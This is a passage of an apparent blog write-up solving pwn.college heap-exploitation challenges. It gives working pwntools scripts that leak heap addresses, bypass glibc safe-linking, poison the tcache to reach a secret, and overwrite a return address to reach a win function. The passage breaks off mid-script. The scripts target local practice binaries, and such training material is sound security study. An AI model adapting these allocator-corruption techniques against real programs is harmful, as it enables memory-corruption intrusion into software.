+<h5 id="Ephemeral-Echo-Hard"><a href="#Ephemeral-Echo-Hard" class="headerlink" title="Ephemeral Echo (Hard)"></a><font style="color:#2F8EF4;">Ephemeral Echo (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737751704-5da91911-ba9e-4eaa-ab32-821aa76b5770.png" srcset="/img/loading.gif" lazyload></p>
+<p>0x2110</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737843503-107412a3-be25-4d89-af6a-73ae4eaa309c.png" srcset="/img/loading.gif" lazyload></p>
+<p>Same as</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737899483-01f4334b-941b-4e5d-93b2-84c67741a5e1.png" srcset="/img/loading.gif" lazyload></p>
+<p>offset_win is 0x1400</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737974364-2f57472a-0e19-4b07-94cd-8fe9f0df1d55.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Subverting-Safe-Linking-Challenges"><a href="#Subverting-Safe-Linking-Challenges" class="headerlink" title="Subverting Safe-Linking Challenges"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Subverting Safe-Linking Challenges</font></h4><h5 id="Seeking-Safe-Secrets-Easy"><a href="#Seeking-Safe-Secrets-Easy" class="headerlink" title="Seeking Safe Secrets (Easy)"></a><font style="color:#2F8EF4;">Seeking Safe Secrets (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772109169281-8c102cd5-7ad4-4db5-9dc6-6a854fba7bd4.png" srcset="/img/loading.gif" lazyload></p>
+<p>wow</p>
+<p>We have safe-linking in glibc 2.35</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772073572970-6256c7d0-df3f-4e99-8b99-047650a8204d.png" srcset="/img/loading.gif" lazyload></p>
+<p>To leak or reset secret</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772081162845-f8cac0ae-6391-4f30-89f6-b8a22d5de39f.png" srcset="/img/loading.gif" lazyload></p>
+<p>no pie</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772084802454-7ebc23b6-7be8-45a8-b018-439cc005cabc.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772091687615-efaed352-d701-4339-a497-dd31cd4c893f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772093213954-b1d68bbc-79f6-487f-a0a7-07cce2fe11bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>We can malloc at secret.</p>
+<p>When malloc , the pointer of entries[bin] will be reset to the pointer at chunk’s *fd</p>
+<p>The pointer to  NULL can be currputed as secret’s f-8-bytes</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: secret_addr = 0x43bcd0<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     #p.recvuntil(b&quot;Data: &quot;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 0\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;puts\n 0\n \n&#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     en_next = u64(p.recvline().strip(b&quot;\n&quot;).ljust(8, b&quot;\x00&quot;))<br>   ...:     print(&quot;en_next: &quot;, hex(en_next))<br>   ...:     heap_base_addr = en_next &lt;&lt; 12<br>   ...:     next_p = (heap_base_addr &gt;&gt; 12)^secret_addr<br>   ...:     #gdb.attach(p)<br>   ...:     pause()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 0\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 1\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 1\n &#x27;)<br>   ...:     p.sendline(p64(next_p))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 0\n30\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n30\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 2\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;puts\n 2\n &#x27;)<br>   ...:     p.recvuntil(b&quot;Data: &quot;)<br>   ...:     en_secret = u64(p.recv(8))<br>   ...:     secret = heap_base_addr &gt;&gt; 12 ^ en_secret<br>   ...:     secret = secret_addr &gt;&gt; 12 ^ secret<br>   ...:     print(&quot;secret:&quot;, hex(secret))<br>   ...:     p.recvuntil(b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;)<br>   ...:     p.sendline(b&quot;send_flag&quot;)<br>   ...:     p.recvuntil(b&quot;Secret: &quot;)<br>   ...:     p.sendline(p64(secret)+p8(0x0)*8)<br>   ...: <br>   ...: <br>   ...: p = process(&#x27;/challenge/seeking-safe-secrets-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772110932509-9860aa21-fc51-473f-b05e-3b16e0fd06ba.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Safe-Secrets-Hard"><a href="#Seeking-Safe-Secrets-Hard" class="headerlink" title="Seeking Safe Secrets (Hard)"></a><font style="color:#2F8EF4;">Seeking Safe Secrets (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111060827-2742cd36-8396-481d-bc90-91f9b9338fce.png" srcset="/img/loading.gif" lazyload></p>
+<p>secret is at 0x4292e0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111613590-df5ba62b-d364-41cc-bcf3-f181a822e9b7.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Sus-Sequence-Safety-Easy"><a href="#Sus-Sequence-Safety-Easy" class="headerlink" title="Sus Sequence Safety (Easy)"></a><font style="color:#2F8EF4;">Sus Sequence Safety (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111831385-c23eaf44-a070-4bde-aba2-0495518ab5dd.png" srcset="/img/loading.gif" lazyload></p>
+<p>glibc 2.35</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772123348758-6590975e-e909-46d4-b20d-9f90b7751147.png" srcset="/img/loading.gif" lazyload></p>
+<p>We can utilize scanf to reset the &amp;ret of main</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772264578297-927d665b-d3d0-448a-b7ad-312dfaf6b718.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772264602400-505c3665-6581-4bb1-afe1-f61536789b44.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772265798108-a49b2cd3-e9e7-4c28-98d2-25b7c230bc56.png" srcset="/img/loading.gif" lazyload></p>
+<p>*ptr is at rbp - 0x110</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269181581-94e49327-5797-4ee0-bf9d-3a00827309c9.png" srcset="/img/loading.gif" lazyload></p>
+<p>made in nano banana-pro</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">步骤</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">指令</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">目标 (Target)</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">写入的内容 (What you write)</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><font style="color:rgb(31, 31, 31);">第一步</font></strong></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;scanf 3&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;allocations[3]&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 指向的地址</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">一个地址值</font></strong><font style="color:rgb(31, 31, 31);"> (</font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;ret_addr&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">)</font></td>
+</tr>
+<tr>
+<td><strong><font style="color:rgb(31, 31, 31);">第二步</font></strong></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;scanf 0&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;allocations[0]&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 指向的地址</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">逻辑入口点</font></strong><font style="color:rgb(31, 31, 31);"> (</font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;win_addr&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">)</font></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [4]: from pwn import *<br>  ...: secret_addr = 0x4292e0<br>  ...: def cyc():<br>  ...:     p.recvuntil(b&quot;[LEAK] The local stack address of your allocations is at: &quot;)<br>  ...:     leak_stack = p.recv(14)<br>  ...:     leak_stack = int(leak_stack, 16)<br>  ...:     p.recvuntil(b&quot;[LEAK] The address of main is at: &quot;)<br>  ...:     main_addr = p.recv(14)<br>  ...:     main_addr = int(main_addr, 16)<br>  ...:     ret_addr = leak_stack + 0x118<br>  ...:     win_addr = main_addr - 0x1b1b + 0x1a00<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 1\n 30\n&#x27;)<br>  ...: <br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;free\n 0\n &#x27;)<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;puts\n 0\n \n&#x27;)<br>  ...:     p.recvuntil(b&quot;Data: &quot;)<br>  ...:     en_next = u64(p.recvline().strip(b&quot;\n&quot;).ljust(8, b&quot;\x00&quot;))<br>  ...:     print(&quot;en_next: &quot;, hex(en_next))<br>  ...:     heap_base_addr = en_next &lt;&lt; 12<br>  ...:     next_p = (heap_base_addr &gt;&gt; 12)^leak_stack<br>  ...:     #gdb.attach(p)<br>  ...:     pause()<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;free\n 1\n &#x27;)<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;scanf\n 1\n &#x27;)<br>  ...:     p.sendline(p64(next_p))<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 2\n 30\n&#x27;)<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 3\n30\n &#x27;)<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;scanf\n 3\n &#x27;)<br>  ...:    #set *allotion[0] = ret_addr !!!!allocations is the array of pointers<br>  ...:     p.sendline(p64(ret_addr))<br>  ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;scanf\n 0\n &#x27;)<br>  ...:     p.sendline(p64(win_addr))<br>  ...:     p.sendline(b&#x27;q \n&#x27;)<br>  ...: <br>  ...: <br>  ...: p = process(&#x27;/challenge/sus-sequence-safety-easy&#x27;)<br>  ...:     #out = b&#x27;&#x27;<br>  ...: cyc()<br>  ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269648675-5b9bbcdc-6e1c-48b1-8c34-f4d83ed6e1ec.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Sus-Sequence-Safety-Hard"><a href="#Sus-Sequence-Safety-Hard" class="headerlink" title="Sus Sequence Safety (Hard)"></a><font style="color:#2F8EF4;">Sus Sequence Safety (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269736796-f73c7e86-a2f2-4034-94f7-31cac9cb0b3a.png" srcset="/img/loading.gif" lazyload></p>
+<p>easy</p>
+<h5 id="Safely-Stack-Summoing-Easy"><a href="#Safely-Stack-Summoing-Easy" class="headerlink" title="Safely Stack Summoing (Easy)"></a><font style="color:#2F8EF4;">Safely Stack Summoing (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772272847667-c26caf4f-7234-4a50-86ec-e5b515da6e8c.png" srcset="/img/loading.gif" lazyload></p>
+<p>make stack???</p>
+<p>We can overwrite secret or puts it</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273470743-07a95157-5775-459b-8a1f-6883395daa2a.png" srcset="/img/loading.gif" lazyload></p>
+<p>save secret at rbp - 0xaf</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273579884-5bfa10b3-b5e4-4cee-81e6-635d311a8007.png" srcset="/img/loading.gif" lazyload></p>
+<p>stack_scanf at rbp - 0x170</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273640352-58d43460-4292-4f7a-9749-3595c254cf8c.png" srcset="/img/loading.gif" lazyload></p>
+<p>stack_free at rbp - 0x130</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273751065-2b25da78-8a43-488e-80b5-b2865d0e1483.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: offset = 0x170 - (0x130 +0x8)<br>   ...: def cyc():<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/echo/scanf/quit):&#x27;,b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:    p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;stack_scanf&quot;)<br>   ...: <br>   ...:    p.sendline(b&quot;k&quot;*offset +p64(0x91))<br>   ...:    p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;stack_free&quot;)<br>   ...:    p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;malloc \n 0 \n128\n&quot;)<br>   ...:    p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;scanf \n 0&quot;)<br>   ...:    p.sendline(b&quot;k&quot;*(0x81+0x10))<br>   ...:    p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;, b&quot;send_flag\n&quot;)<br>   ...:    p.sendline(b&#x27;k&#x27;*0x10)<br>   ...:    #p.sendlineafter(b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;, b&quot;q&quot;)<br>   ...: p = process(&#x27;/challenge/safely-stack-summoning-easy&#x27;)<br>   ...:    #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274104072-f2e53f60-5a06-4b7f-80b0-5ed123e0ce12.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Safely-Stack-Summoing-Hard"><a href="#Safely-Stack-Summoing-Hard" class="headerlink" title="Safely Stack Summoing (Hard)"></a><font style="color:#2F8EF4;">Safely Stack Summoing (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274258496-80eae9ea-f542-4372-b39f-cd039beeb826.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274277598-3f1b5949-6a0f-466b-aa81-caadd95c4dd9.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274301902-6b190856-20d6-4b84-9526-06023c0367fa.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274332304-cfbc830b-66d0-475c-93b5-66ff578b2a58.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274387422-cf663834-7554-414d-a5c9-7ca03b5da9e1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Exploitation</font></h4><h5 id="Overlapping-Odyssey-Easy"><a href="#Overlapping-Odyssey-Easy" class="headerlink" title="Overlapping Odyssey (Easy)"></a><font style="color:#2F8EF4;">Overlapping Odyssey (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274591606-84a2fa98-8862-4998-a2d3-62dc83fa54b0.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772332992498-b3d95bba-5ea0-4809-83ef-929cc09c1141.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:rgb(15, 17, 21);">malloc记录的可读写长度比实际分配多 16 字节</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772333071250-605812c0-c5b6-4831-98d9-6fbce3bf91de.png" srcset="/img/loading.gif" lazyload></p>
+<p>free and set *ptr &#x3D; 0LL，but data still saved</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772333542270-02a61a07-631f-48d7-9fdb-f480a9e980db.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看这个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337125963-7d306b1e-2f85-4a87-b948-06ad440424fe.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337152764-53162b33-d8ec-4eb8-8763-f1b330067da7.png" srcset="/img/loading.gif" lazyload></p>
+<p>read_flag funtion</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337414754-1c6e24d9-e935-456d-94cd-ba9f1f77ce29.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337663369-85cdd9ba-f6d9-4b29-96ff-a523f3fcda67.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok</p>
+<p>after &gt;&gt;12, the  *next(8bytes) is 5bytes</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772339422188-a3c9c0d7-9fe8-40b2-be0a-95f97bda1b30.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772339433538-b76f859d-f21c-4f13-b8ac-83fdc98e2ed8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772354143983-8a989c96-1274-464a-a9ca-e9e8564d13f9.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772354180635-08a917f3-162b-4114-9c4e-6824e221e9d4.png" srcset="/img/loading.gif" lazyload></p>
+<p>error</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358065522-020892d2-aff2-4906-b690-ef82dd5c6f62.png" srcset="/img/loading.gif" lazyload></p>
+<p>find</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [4]: from pwn import *<br>   ...: context.log_level = &#x27;debug&#x27;<br>   ...: secret_addr = 0x4292e0<br>   ...: def cyc():<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 1\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 0\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 0\n 30\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;safe_write\n 0 \n&#x27;)<br>   ...:     p.recvuntil(b&quot;[*] safe_write(allocations[0])\n&quot;)<br>   ...:     #p.recvline()<br>   ...:     #p.recvline()<br>   ...:     en_next = u64(p.recv(5).ljust(8,b&quot;\x00&quot;))<br>   ...:     print(&quot;en_next: &quot;, hex(en_next))<br>   ...:     heap_base_addr = en_next &lt;&lt; 12<br>   ...:     print(&quot;heap_base_addr&quot;,hex(heap_base_addr))<br>   ...:     print(&quot;chunk1&quot;,hex(heap_base_addr+0x8e0))<br>   ...:     print(&quot;9_n&quot;,hex((heap_base_addr &gt;&gt; 12) ^ (heap_base_addr + 0x8e0)))<br>   ...:     #next_p = (heap_base_addr &gt;&gt; 12)^leak_stack<br>   ...:     #gdb.attach(p)<br>   ...:     #pause()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 1\n 952\n&#x27;)<br>   ...:     #p.interactive()<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 2\n 944\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;malloc\n 3\n944\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 3\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit):&#x27;, b&#x27;free\n 